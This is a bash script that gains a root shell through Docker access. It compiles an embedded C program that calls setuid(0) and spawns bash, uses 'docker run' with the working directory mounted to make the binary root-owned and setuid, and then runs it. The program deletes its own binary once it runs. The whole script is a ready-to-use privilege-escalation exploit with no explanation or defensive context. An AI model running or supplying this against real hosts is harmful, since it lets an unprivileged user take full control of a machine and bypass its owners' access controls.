#!/usr/bin/env bash

gcc -o ./enter_root_bash -x c - <<ENDOFMESSAGE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[])
{

    (void) argc;
    (void) argv;

    printf("real uid\t %d\n",getuid());
    printf("effective uid\t %d\n",geteuid());
    if (setuid(0) == -1)
    {
        perror("setuid(0) failed");
        return -1;
    }
    if (setgid(0) == -1)
    {
        perror("setgid(0) failed");
        return -1;
    }

    system("rm ./enter_root_bash");
    return system("bash");
}
ENDOFMESSAGE

docker run --rm -v $(pwd):/work ubuntu chown root:root /work/enter_root_bash
docker run --rm -v $(pwd):/work ubuntu chmod u+s /work/enter_root_bash

exec ./enter_root_bash
